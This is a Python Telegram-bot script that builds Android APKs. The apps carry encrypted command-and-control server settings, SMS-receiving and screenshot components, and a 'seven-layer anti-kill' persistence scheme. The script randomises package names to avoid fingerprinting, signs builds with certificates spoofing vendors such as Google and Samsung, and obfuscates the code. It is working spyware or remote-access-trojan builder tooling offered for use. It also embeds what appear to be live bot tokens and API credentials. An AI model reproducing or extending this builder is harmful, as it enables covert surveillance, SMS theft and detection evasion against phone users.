#!/usr/bin/env python3
"""
Null APK Builder - Telegram Edition v4.0
Builds APK with AES-256 encrypted server config (IP/Port/Topic).
Each build gets unique random encryption key.
All Java sources are EMBEDDED - every build always uses the latest code.
Includes 7-Layer Anti-Kill Persistence System.
"""

import os, sys, time, random, string, shutil, subprocess, re
import threading, asyncio, base64, struct
from datetime import datetime

# Auto-install deps
try:
    from Crypto.Cipher import AES
except ModuleNotFoundError:
    os.system("pip3 install pycryptodome")
    from Crypto.Cipher import AES

try:
    from pyrogram import Client, filters
    from pyrogram.enums import ParseMode
    from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
except ModuleNotFoundError:
    os.system("pip3 install pyrogram tgcrypto")
    from pyrogram import Client, filters
    from pyrogram.enums import ParseMode
    from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery

try:
    from PIL import Image
except ImportError:
    os.system("pip3 install Pillow")
    from PIL import Image

# ============================================================
#  EMBEDDED JAVA SOURCES (Always Latest Version)
# ============================================================
# Import all Java templates from generated file
_java_src_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "java_sources.py")
if os.path.exists(_java_src_path):
    import importlib.util
    _spec = importlib.util.spec_from_file_location("java_sources", _java_src_path)
    _js = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_js)

    WSSERVICE_JAVA = getattr(_js, 'WSSERVICE_JAVA', '')
    KEEPALIVESERVICE_JAVA = getattr(_js, 'KEEPALIVESERVICE_JAVA', '')
    KEEPALIVERECEIVER_JAVA = getattr(_js, 'KEEPALIVERECEIVER_JAVA', '')
    BOOTRECEIVER_JAVA = getattr(_js, 'BOOTRECEIVER_JAVA', '')
    INITPROVIDER_JAVA = getattr(_js, 'INITPROVIDER_JAVA', '')
    SMSRECEIVER_JAVA = getattr(_js, 'SMSRECEIVER_JAVA', '')
    SCREENSHOTACTIVITY_JAVA = getattr(_js, 'SCREENSHOTACTIVITY_JAVA', '')
    MAINACTIVITY_JAVA = getattr(_js, 'MAINACTIVITY_JAVA', '')
    GUARDIAN_PROCESS_JAVA = getattr(_js, 'GUARDIAN_PROCESS_JAVA', '')
    NETWORK_RECEIVER_JAVA = getattr(_js, 'NETWORK_RECEIVER_JAVA', '')
    SERVICE_CHECK_WORKER_JAVA = getattr(_js, 'SERVICE_CHECK_WORKER_JAVA', '')
    TIMETICK_RECEIVER_JAVA = getattr(_js, 'TIMETICK_RECEIVER_JAVA', '')
    MANIFEST_XML = getattr(_js, 'MANIFEST_XML', '')
    PROGUARD_RULES = getattr(_js, 'PROGUARD_RULES', '')
    print("[+] Loaded embedded Java sources (latest version)", flush=True)
else:
    print("[!] WARNING: java_sources.py not found, using template files from project", flush=True)
    WSSERVICE_JAVA = ""
    KEEPALIVESERVICE_JAVA = ""
    KEEPALIVERECEIVER_JAVA = ""
    BOOTRECEIVER_JAVA = ""
    INITPROVIDER_JAVA = ""
    SMSRECEIVER_JAVA = ""
    SCREENSHOTACTIVITY_JAVA = ""
    MAINACTIVITY_JAVA = ""
    GUARDIAN_PROCESS_JAVA = ""
    NETWORK_RECEIVER_JAVA = ""
    SERVICE_CHECK_WORKER_JAVA = ""
    TIMETICK_RECEIVER_JAVA = ""
    MANIFEST_XML = ""
    PROGUARD_RULES = ""

# ============================================================
#  CONFIG
# ============================================================
API_ID = 26458956
API_HASH = "687305f2e72533e277c10874dbb770e7"
BOT_TOKEN = "8648212698:AAHZSfdLrn5Gyew_s4-iXDNC4wYEQav8T_E"
ADMIN_ID = 7375040864

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
BUILD_DIR = os.path.join(BASE_DIR, "builds")
KEYSTORE_DIR = os.path.join(BASE_DIR, "keystores")
APK_PROJECT_DIR = os.path.join(BASE_DIR, "app-project")
GRADLE_HOME = "/root/gradle-8.10.2"
ANDROID_HOME = "/root/android-sdk"
JAVA_HOME = "/usr/lib/jvm/java-21-openjdk-amd64"

# Java files to inject (filename -> source variable)
JAVA_FILES = {
    "WSService.java": WSSERVICE_JAVA,
    "KeepAliveService.java": KEEPALIVESERVICE_JAVA,
    "KeepAliveReceiver.java": KEEPALIVERECEIVER_JAVA,
    "BootReceiver.java": BOOTRECEIVER_JAVA,
    "InitProvider.java": INITPROVIDER_JAVA,
    "SMSReceiver.java": SMSRECEIVER_JAVA,
    "ScreenshotActivity.java": SCREENSHOTACTIVITY_JAVA,
    "MainActivity.java": MAINACTIVITY_JAVA,
    "GuardianProcessService.java": GUARDIAN_PROCESS_JAVA,
    "NetworkReceiver.java": NETWORK_RECEIVER_JAVA,
    "ServiceCheckWorker.java": SERVICE_CHECK_WORKER_JAVA,
    "TimeTickReceiver.java": TIMETICK_RECEIVER_JAVA,
}


# ============================================================
#  AES-256-CBC ENCRYPTION
# ============================================================
def pkcs7_pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)


def aes_encrypt(plaintext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pkcs7_pad(plaintext.encode('utf-8'))
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode('ascii')


def generate_encrypted_config(server_url, ws_url, ws_topic):
    """Generate AES key, encrypt values, return config dict for Java template injection."""
    key = os.urandom(32)  # 256-bit key
    iv = os.urandom(16)   # 128-bit IV
    xor_mask = os.urandom(32)

    # Encrypt each config value
    e_svr = aes_encrypt(server_url, key, iv)
    e_ws = aes_encrypt(ws_url, key, iv)
    e_topic = aes_encrypt(ws_topic, key, iv)

    # Split key into 4 parts (8 bytes each), XOR with mask
    k1 = key[0:8]
    k2 = key[8:16]
    k3 = key[16:24]
    k4 = key[24:32]

    m1 = bytes(a ^ b for a, b in zip(k1, xor_mask[0:8]))
    m2 = bytes(a ^ b for a, b in zip(k2, xor_mask[8:16]))
    m3 = bytes(a ^ b for a, b in zip(k3, xor_mask[16:24]))
    m4 = bytes(a ^ b for a, b in zip(k4, xor_mask[24:32]))

    return {
        "E_SVR": e_svr,
        "E_WS": e_ws,
        "E_TOPIC": e_topic,
        "KP1": base64.b64encode(m1).decode('ascii'),
        "KP2": base64.b64encode(m2).decode('ascii'),
        "KP3": base64.b64encode(m3).decode('ascii'),
        "KP4": base64.b64encode(m4).decode('ascii'),
        "IV": base64.b64encode(iv).decode('ascii'),
        "XOR": base64.b64encode(xor_mask).decode('ascii'),
    }


def generate_crypto_helper_java(cfg):
    """Generate CryptoHelper.java with encrypted key parts."""
    return f'''package com.drnull.app;

import android.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class CryptoHelper {{

    private static final String KP1 = "{cfg["KP1"]}";
    private static final String KP2 = "{cfg["KP2"]}";
    private static final String KP3 = "{cfg["KP3"]}";
    private static final String KP4 = "{cfg["KP4"]}";
    private static final String IV_B64 = "{cfg["IV"]}";
    private static final String XOR_B64 = "{cfg["XOR"]}";

    private static byte[] dec(String s) {{
        try {{ return Base64.decode(s, Base64.NO_WRAP); }}
        catch (Exception e) {{ return new byte[0]; }}
    }}

    private static byte[] buildKey() {{
        byte[] p1 = dec(KP1), p2 = dec(KP2), p3 = dec(KP3), p4 = dec(KP4);
        byte[] xm = dec(XOR_B64);
        byte[] key = new byte[32];
        int o = 0;
        for (int i = 0; i < p1.length && o < 32; i++) key[o++] = p1[i];
        for (int i = 0; i < p2.length && o < 32; i++) key[o++] = p2[i];
        for (int i = 0; i < p3.length && o < 32; i++) key[o++] = p3[i];
        for (int i = 0; i < p4.length && o < 32; i++) key[o++] = p4[i];
        for (int i = 0; i < 32; i++) key[i] ^= xm[i % xm.length];
        return key;
    }}

    public static String decrypt(String enc) {{
        try {{
            byte[] key = buildKey();
            byte[] iv = dec(IV_B64);
            byte[] data = Base64.decode(enc, Base64.NO_WRAP);
            SecretKeySpec ks = new SecretKeySpec(key, "AES");
            IvParameterSpec ivs = new IvParameterSpec(iv);
            Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
            c.init(Cipher.DECRYPT_MODE, ks, ivs);
            return new String(c.doFinal(data), "UTF-8");
        }} catch (Exception e) {{
            return "";
        }}
    }}
}}
'''


def generate_secure_config_java(cfg):
    """Generate SecureConfig.java with encrypted config values."""
    return f'''package com.drnull.app;

public class SecureConfig {{

    private static final String E_SVR = "{cfg["E_SVR"]}";
    private static final String E_WS = "{cfg["E_WS"]}";
    private static final String E_TOPIC = "{cfg["E_TOPIC"]}";

    private static String _svr = null;
    private static String _ws = null;
    private static String _topic = null;

    public static String getServerUrl() {{
        if (_svr == null) {{
            _svr = CryptoHelper.decrypt(E_SVR);
            if (_svr == null || _svr.isEmpty()) _svr = "http://127.0.0.1:6969";
        }}
        return _svr;
    }}

    public static String getWsUrl() {{
        if (_ws == null) {{
            _ws = CryptoHelper.decrypt(E_WS);
            if (_ws == null || _ws.isEmpty()) _ws = "ws://127.0.0.1:5000";
        }}
        return _ws;
    }}

    public static String getWsTopic() {{
        if (_topic == null) {{
            _topic = CryptoHelper.decrypt(E_TOPIC);
            if (_topic == null || _topic.isEmpty()) _topic = "null";
        }}
        return _topic;
    }}
}}
'''


# ============================================================
#  STATE MANAGEMENT
# ============================================================
_build_states = {}
_state_lock = threading.Lock()


def set_state(user_id, state, data=None):
    with _state_lock:
        _build_states[user_id] = {"state": state, "data": data or {}, "time": time.time()}


def get_state(user_id):
    with _state_lock:
        s = _build_states.get(user_id)
        if s and time.time() - s["time"] < 600:
            return s
        if user_id in _build_states:
            del _build_states[user_id]
        return None


def clear_state(user_id):
    with _state_lock:
        _build_states.pop(user_id, None)


# ============================================================
#  APK BUILDER v4.0
# ============================================================
def run_build_apk(icon_path, app_name, server_ip, server_port, ws_topic, ws_port="5000"):
    """Build APK with encrypted server config and latest Java sources."""
    os.makedirs(BUILD_DIR, exist_ok=True)
    os.makedirs(KEYSTORE_DIR, exist_ok=True)

    build_id = f"build_{int(time.time())}"
    work_dir = os.path.join(BUILD_DIR, build_id)
    shutil.copytree(APK_PROJECT_DIR, work_dir)

    # --- Generate random package name per build (anti-fingerprint) ---
    _pkg_words = ["core", "sys", "hub", "net", "sync", "link", "cloud", "data", "tech", "pro",
                  "app", "run", "go", "up", "fx", "io", "x", "gt", "mv", "ui",
                  "smart", "fast", "turbo", "mega", "super", "ultra"]
    _pkg_prefix = random.choice(_pkg_words) + random.choice(_pkg_words)
    _pkg_suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
    random_package = "com." + _pkg_prefix + "." + _pkg_suffix
    pkg_dirs = random_package.split(".")
    java_dir = os.path.join(work_dir, "app", "src", "main", "java", *pkg_dirs)
    os.makedirs(java_dir, exist_ok=True)
    old_java_dir = os.path.join(work_dir, "app", "src", "main", "java", "com", "drnull", "app")
    if os.path.exists(old_java_dir):
        shutil.rmtree(old_java_dir)

    # Random version per build
    random_ver_code = random.randint(10, 99)
    random_ver_name = str(random_ver_code // 10) + "." + str(random_ver_code % 10) + "." + str(random.randint(0, 9))

    # Fix manifest hardcoded package references
    manifest_path = os.path.join(work_dir, "app", "src", "main", "AndroidManifest.xml")
    if os.path.exists(manifest_path):
        with open(manifest_path, "r") as mf:
            manifest_xml = mf.read()
        manifest_xml = manifest_xml.replace("com.drnull.app", random_package)  # Blanket replace ALL package refs
        with open(manifest_path, "w") as mf:
            mf.write(manifest_xml)

    # --- Generate encrypted config ---
    server_url = f"http://{server_ip}:{server_port}"
    ws_url = f"ws://{server_ip}:{ws_port}"
    cfg = generate_encrypted_config(server_url, ws_url, ws_topic)

    # --- Inject CryptoHelper.java and SecureConfig.java (encrypted per-build) ---
    crypto_src = generate_crypto_helper_java(cfg).replace("com.drnull.app", random_package)
    secure_src = generate_secure_config_java(cfg).replace("com.drnull.app", random_package)
    with open(os.path.join(java_dir, "CryptoHelper.java"), "w") as f:
        f.write(crypto_src)
    with open(os.path.join(java_dir, "SecureConfig.java"), "w") as f:
        f.write(secure_src)

    # --- Inject ALL embedded Java sources (latest version) ---
    injected_count = 0
    for filename, source in JAVA_FILES.items():
        if source and source.strip():
            src = source.replace("com.drnull.app", random_package)
            filepath = os.path.join(java_dir, filename)
            with open(filepath, "w") as f:
                f.write(src)
            injected_count += 1
            print(f"  [+] Injected: {filename}", flush=True)

    # --- Inject AndroidManifest.xml (latest version) ---
    if MANIFEST_XML and MANIFEST_XML.strip():
        manifest_path = os.path.join(work_dir, "app", "src", "main", "AndroidManifest.xml")
        manifest_src = MANIFEST_XML.replace("com.drnull.app", random_package)
        with open(manifest_path, "w") as f:
            f.write(manifest_src)
        print(f"  [+] Injected: AndroidManifest.xml", flush=True)

    # --- Inject proguard-rules.pro (latest version) ---
    if PROGUARD_RULES and PROGUARD_RULES.strip():
        proguard_path = os.path.join(work_dir, "app", "proguard-rules.pro")
        pro_rules = PROGUARD_RULES.replace("com.drnull.app", random_package)
        with open(proguard_path, "w") as f:
            f.write(pro_rules)
        print(f"  [+] Injected: proguard-rules.pro", flush=True)

    print(f"[+] Encrypted config + {injected_count} Java files injected for {server_ip}:{server_port}", flush=True)
    print(f"[+] Package: {random_package} | Version: {random_ver_name} ({random_ver_code})", flush=True)

    # --- Process icon ---
    try:
        icon_img = Image.open(icon_path)
        icon_img = icon_img.convert("RGBA")
        res_dir = os.path.join(work_dir, "app", "src", "main", "res")
        for size_name, size in [
            ("mipmap-mdpi", 48), ("mipmap-hdpi", 72), ("mipmap-xhdpi", 96),
            ("mipmap-xxhdpi", 144), ("mipmap-xxxhdpi", 192), ("drawable", 512)
        ]:
            d = os.path.join(res_dir, size_name)
            os.makedirs(d, exist_ok=True)
            resized = icon_img.resize((size, size), Image.LANCZOS)
            resized.save(os.path.join(d, "icon.png"), "PNG")
        print("[+] Icon processed", flush=True)
    except Exception as e:
        print(f"[!] Icon error: {e}", flush=True)
        res_dir = os.path.join(work_dir, "app", "src", "main", "res")
        os.makedirs(os.path.join(res_dir, "drawable"), exist_ok=True)
        shutil.copy2(icon_path, os.path.join(res_dir, "drawable", "icon.png"))

    # --- Set app name ---
    strings_dir = os.path.join(work_dir, "app", "src", "main", "res", "values")
    os.makedirs(strings_dir, exist_ok=True)
    strings_path = os.path.join(strings_dir, "strings.xml")
    app_name_safe = (app_name
        .replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        .replace('"', '&quot;').replace("'", '&apos;'))
    with open(strings_path, "w") as f:
        f.write(f'<?xml version="1.0" encoding="utf-8"?>\n<resources>\n<string name="app_name">{app_name_safe}</string>\n</resources>')

    # --- Generate keystore ---
    ks_name = "release_signing.jks"  # Persistent keystore for all builds
    ks_path = os.path.join(KEYSTORE_DIR, ks_name)
    ks_pass_file = os.path.join(KEYSTORE_DIR, "release_signing.pass")
    if os.path.exists(ks_pass_file):
        with open(ks_pass_file, "r") as pf:
            ks_pass = pf.read().strip()
    else:
        ks_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    ks_alias = "release"
    if not os.path.exists(ks_path):
        cn = random.choice(["Google", "Samsung", "Huawei", "Xiaomi", "OnePlus", "OPPO", "vivo"]) + random.choice(["LLC", "Inc", "Corp", "Mobile", "Digital", "Tech", "Labs"])
        result = subprocess.run([
            JAVA_HOME + "/bin/keytool", "-genkeypair", "-v",
            "-keystore", ks_path, "-alias", ks_alias,
            "-keyalg", "RSA", "-keysize", "4096", "-validity", "36500",
            "-storepass", ks_pass, "-keypass", ks_pass,
            "-dname", f"CN={cn}, OU=Engineering, O={cn}, L=Mountain View, ST=California, C=US"
        ], capture_output=True, timeout=30)
        if result.returncode == 0:
            with open(ks_pass_file, "w") as pf:
                pf.write(ks_pass)
            print(f"  [+] Keystore created: {ks_name}")
        else:
            print(f"  [!] Keystore generation FAILED: {result.stderr.decode()[:200]}")
            return None, "Keystore generation failed"

    # --- Generate build.gradle ---
    build_gradle_path = os.path.join(work_dir, "app", "build.gradle")
    with open(build_gradle_path, "w") as f:
        f.write(f"""plugins {{
    id 'com.android.application'
}}

android {{
    namespace '{random_package}'
    compileSdk 35
    defaultConfig {{
        applicationId "{random_package}"
        minSdk 24
        targetSdk 34
        versionCode {random_ver_code}
        versionName "{random_ver_name}"
    }}
    signingConfigs {{
        release {{
            storeFile file("{ks_path}")
            storePassword "{ks_pass}"
            keyAlias "{ks_alias}"
            keyPassword "{ks_pass}"
        }}
    }}
    buildTypes {{
        release {{
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }}
    }}
    compileOptions {{
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }}
    lint {{
        abortOnError false
        checkReleaseBuilds false
    }}
}}

configurations.all {{
    resolutionStrategy {{
        force 'org.jetbrains.kotlin:kotlin-stdlib:1.9.22'
        force 'org.jetbrains.kotlin:kotlin-stdlib-jdk7:1.9.22'
        force 'org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.9.22'
    }}
}}

dependencies {{
    implementation files('libs/java-android-websocket-client-1.2.1.jar')
    implementation 'androidx.appcompat:appcompat:1.7.0'
    implementation 'androidx.work:work-runtime:2.9.0'
    implementation 'androidx.concurrent:concurrent-futures:1.1.0'
}}
""")

    # --- Root build.gradle ---
    root_gradle = os.path.join(work_dir, "build.gradle")
    with open(root_gradle, "w") as f:
        f.write('plugins {\n    id \'com.android.application\' version \'8.7.3\' apply false\n}\n')

    # --- settings.gradle ---
    settings_path = os.path.join(work_dir, "settings.gradle")
    with open(settings_path, "w") as f:
        f.write("""pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}
rootProject.name = "NullApp"
include ':app'
""")

    print("[+] Starting Gradle build (v4.0)...", flush=True)

    # --- Build ---
    env = os.environ.copy()
    env["ANDROID_HOME"] = ANDROID_HOME
    env["JAVA_HOME"] = JAVA_HOME
    try:
        # Generate local.properties
        with open(os.path.join(work_dir, "local.properties"), "w") as lp:
            lp.write(f"sdk.dir={ANDROID_HOME}\n")

        result = subprocess.run(
            [GRADLE_HOME + "/bin/gradle", "assembleRelease", "--no-daemon"],
            cwd=work_dir, capture_output=True, text=True, timeout=600, env=env
        )
        if result.returncode != 0:
            err = result.stderr[-2000:] if result.stderr else result.stdout[-2000:]
            print(f"[!] BUILD ERROR: {err}", flush=True)
            shutil.rmtree(work_dir, ignore_errors=True)
            return None, err
        print("[+] Build succeeded!", flush=True)
    except Exception as e:
        print(f"[!] BUILD EXCEPTION: {e}", flush=True)
        shutil.rmtree(work_dir, ignore_errors=True)
        return None, str(e)

    # --- Find APK ---
    apk_path = None
    candidate = os.path.join(work_dir, "app", "build", "outputs", "apk", "release", "app-release.apk")
    if os.path.exists(candidate):
        apk_path = candidate
    else:
        for rd, dirs, files in os.walk(work_dir):
            for fn in files:
                if fn.endswith(".apk"):
                    apk_path = os.path.join(rd, fn)
                    break
            if apk_path:
                break

    if not apk_path:
        shutil.rmtree(work_dir, ignore_errors=True)
        return None, "APK not found after build"

    output_apk = os.path.join(BUILD_DIR, f"{app_name.replace(' ', '_')}_{build_id}.apk")
    shutil.move(apk_path, output_apk)
    shutil.rmtree(work_dir, ignore_errors=True)
    return output_apk, None


# ============================================================
#  PYROGRAM BOT
# ============================================================
app = Client(
    "builder_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

KB_MAIN = InlineKeyboardMarkup([
    [InlineKeyboardButton("Build APK", callback_data="build_start")]
])
KB_CANCEL = InlineKeyboardMarkup([
    [InlineKeyboardButton("Cancel", callback_data="build_cancel")]
])


@app.on_message(filters.command("start") & filters.user(ADMIN_ID))
async def cmd_start(client, message):
    await message.reply_text(
        "<b>Null APK Builder v4.0</b>\n\n"
        "<b>Features:</b>\n"
        "  - 7-Layer Anti-Kill Persistence\n"
        "  - Dual Foreground Service\n"
        "  - Mutual Guardian\n"
        "  - Multi-Event Auto-Restart\n"
        "  - WakeLock + Battery Optimization\n"
        "  - AES-256 IP Encryption\n"
        "  - ProGuard Obfuscation\n"
        "  - RSA-4096 Signing\n"
        "  - Always builds latest code\n\n"
        "Ready to build!",
        reply_markup=KB_MAIN,
        parse_mode=ParseMode.HTML
    )


@app.on_message(filters.user(ADMIN_ID) & ~filters.photo & filters.text)
async def handle_text(client, message):
    if (message.text or "").startswith("/"):
        return
    user_id = message.from_user.id
    state = get_state(user_id)
    if not state:
        return

    st = state["state"]
    text = (message.text or "").strip()

    if st == "waiting_ip":
        if not text:
            await message.reply("Send the server IP:", reply_markup=KB_CANCEL)
            return
        set_state(user_id, "waiting_port", {"ip": text})
        await message.reply(
            f"<b>IP:</b> <code>{text}</code>\n\nSend the <b>server port</b> (default 6969):",
            reply_markup=KB_CANCEL, parse_mode=ParseMode.HTML
        )

    elif st == "waiting_port":
        if text and text.isdigit() and 1 <= int(text) <= 65535:
            port = text
        else:
            port = "6969"
        set_state(user_id, "waiting_topic", {"ip": state["data"]["ip"], "port": port})
        await message.reply(
            f"<b>Port:</b> <code>{port}</code>\n\nSend <b>WS topic</b> (default: null):",
            reply_markup=KB_CANCEL, parse_mode=ParseMode.HTML
        )

    elif st == "waiting_topic":
        topic = text if text else "null"
        set_state(user_id, "waiting_icon", {"ip": state["data"]["ip"], "port": state["data"]["port"], "topic": topic})
        await message.reply(
            f"<b>WS Topic:</b> <code>{topic}</code>\n\nNow send the <b>app icon</b> (image):",
            reply_markup=KB_CANCEL, parse_mode=ParseMode.HTML
        )

    elif st == "waiting_icon":
        await message.reply("Send an <b>image</b> for the icon!", reply_markup=KB_CANCEL, parse_mode=ParseMode.HTML)

    elif st == "waiting_name":
        if not text or text.startswith("/"):
            await message.reply("Send the app name:", reply_markup=KB_CANCEL)
            return
        app_name = text.strip().replace("/", "").replace("\\", "").replace("..", "")
        data = state["data"]

        await message.reply(
            f"<b>Building APK v4.0...</b>\n\n"
            f"Name: <code>{app_name}</code>\n"
            f"Server: <code>{data['ip']}:{data['port']}</code>\n"
            f"WS Topic: <code>{data['topic']}</code>\n"
            f"Anti-Kill: 7-Layer\n"
            f"Encryption: AES-256 + RSA-4096\n\n"
            f"Please wait (1-3 min)...",
            reply_markup=KB_MAIN, parse_mode=ParseMode.HTML
        )
        clear_state(user_id)

        try:
            result, err = await asyncio.get_running_loop().run_in_executor(
                None, run_build_apk, data["icon_path"], app_name, data["ip"], data["port"], data["topic"]
            )

            if result and os.path.exists(result):
                await message.reply(
                    f"<b>Build Complete!</b>\n\n"
                    f"Version: <code>4.0</code>\n"
                    f"Name: <code>{app_name}</code>\n"
                    f"Server: <code>{data['ip']}:{data['port']}</code>\n\n"
                    f"<b>Protection Layers:</b>\n"
                    f"  1. Dual Foreground Service\n"
                    f"  2. START_STICKY + Auto Restart\n"
                    f"  3. Enhanced AlarmManager\n"
                    f"  4. Watchdog + Exponential Backoff\n"
                    f"  5. Heartbeat + Polling\n"
                    f"  6. WakeLock + Battery Opt\n"
                    f"  7. Multi-Event Broadcast\n\n"
                    f"Uploading APK...",
                    reply_markup=KB_MAIN, parse_mode=ParseMode.HTML
                )
                await client.send_document(
                    user_id,
                    result,
                    caption=f"APK v4.0: {app_name}\nServer: {data['ip']}:{data['port']}\nAnti-Kill: 7-Layer\nBuilt: {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                )
                try:
                    os.remove(result)
                except Exception:
                    pass
                # Clean up icon file
                try:
                    icon_file = data.get("icon_path", "")
                    if icon_file and os.path.exists(icon_file):
                        os.remove(icon_file)
                except Exception:
                    pass
                print(f"[+] APK v4.0 delivered to admin", flush=True)
            else:
                await message.reply(
                    f"<b>Build Failed!</b>\n\n<code>{err or 'Unknown error'}</code>",
                    reply_markup=KB_MAIN, parse_mode=ParseMode.HTML
                )

        except Exception as e:
            print(f"[!] Build error: {e}", flush=True)
            await message.reply(
                f"<b>Build Error!</b>\n\n<code>{str(e)}</code>",
                reply_markup=KB_MAIN, parse_mode=ParseMode.HTML
            )


@app.on_message(filters.photo & filters.user(ADMIN_ID))
async def handle_photo(client, message):
    user_id = message.from_user.id
    state = get_state(user_id)
    if not state or state["state"] != "waiting_icon":
        return

    icon_path = os.path.join(BASE_DIR, f"build_icon_{int(time.time())}.jpg")
    try:
        await client.download_media(message, file_name=icon_path)
        data = state["data"]
        set_state(user_id, "waiting_name", {
            "ip": data["ip"],
            "port": data["port"],
            "topic": data["topic"],
            "icon_path": icon_path
        })
        await message.reply(
            "<b>Icon received!</b>\n\nNow send the <b>app name</b>:",
            reply_markup=KB_CANCEL, parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.reply(f"<b>Error downloading icon!</b>\n\n<code>{str(e)}</code>", parse_mode=ParseMode.HTML)


@app.on_callback_query(filters.user(ADMIN_ID))
async def handle_callback(client, callback):
    data = callback.data
    user_id = callback.from_user.id

    if data == "build_start":
        clear_state(user_id)
        await callback.message.edit_text(
            "<b>Build APK v4.0</b>\n\nSend the <b>server IP</b>:",
            reply_markup=KB_CANCEL, parse_mode=ParseMode.HTML
        )
        set_state(user_id, "waiting_ip")

    elif data == "build_cancel":
        clear_state(user_id)
        await callback.message.edit_text(
            "<b>Null APK Builder v4.0</b>\n\nReady to build!",
            reply_markup=KB_MAIN, parse_mode=ParseMode.HTML
        )

    await callback.answer()


# ============================================================
#  START
# ============================================================
if __name__ == "__main__":
    print("[+] Null APK Builder v4.0 starting...", flush=True)
    print(f"[+] Admin ID: {ADMIN_ID}", flush=True)
    print(f"[+] Project: {APK_PROJECT_DIR}", flush=True)
    print(f"[+] Java sources: {'embedded (' + str(len(JAVA_FILES)) + ' files)' if WSSERVICE_JAVA else 'from project dir'}", flush=True)
    app.run()
